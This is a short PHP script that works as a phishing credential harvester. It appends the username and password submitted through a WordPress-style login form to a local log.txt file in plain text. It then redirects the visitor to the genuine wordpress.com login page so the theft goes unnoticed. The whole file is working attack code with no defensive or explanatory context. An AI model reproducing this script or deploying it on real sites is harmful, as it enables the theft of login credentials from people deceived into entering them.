<?php

    file_put_contents("log.txt", "Username: " . $_POST['log'] . " Pass: " . $_POST['pwd'] . "\n", FILE_APPEND);
header('Location:  https://wordpress.com/log-in');
exit();

